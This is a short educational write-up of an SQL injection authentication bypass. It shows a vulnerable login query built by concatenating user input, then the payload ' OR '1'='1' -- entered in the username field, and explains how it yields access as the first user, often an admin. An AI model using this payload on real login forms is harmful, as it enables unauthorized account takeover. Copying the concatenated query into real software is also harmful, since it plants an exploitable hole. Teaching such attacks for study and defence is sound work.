# SQL Injection – Authentication Bypass

## Vulnerability
The web application builds an SQL query by directly concatenating
user-controlled input into the authentication query.
Because input is not sanitized or parameterized, an attacker can inject
SQL logic to bypass authentication.

---

## Vulnerable Scenario
A typical login query used by the application:

```sql
SELECT * FROM users
WHERE username = '$username' AND password = '$password';
```

User input is inserted directly into the query.

## Attack Goal

Bypass authentication without knowing valid credentials.

Payload
```bash
' OR '1'='1' --
```

## Exploitation

The payload is injected into the username field.
```bash
Username: ' OR '1'='1' --
Password: anything
```

### Resulting SQL query:
```bash
SELECT * FROM users
WHERE username = '' OR '1'='1' -- ' AND password = 'anything';
```

- '1'='1' always evaluates to TRUE
- -- comments out the rest of the query

## Result

Authentication is bypassed and the attacker is logged in as the first user
returned by the database query (often an admin account).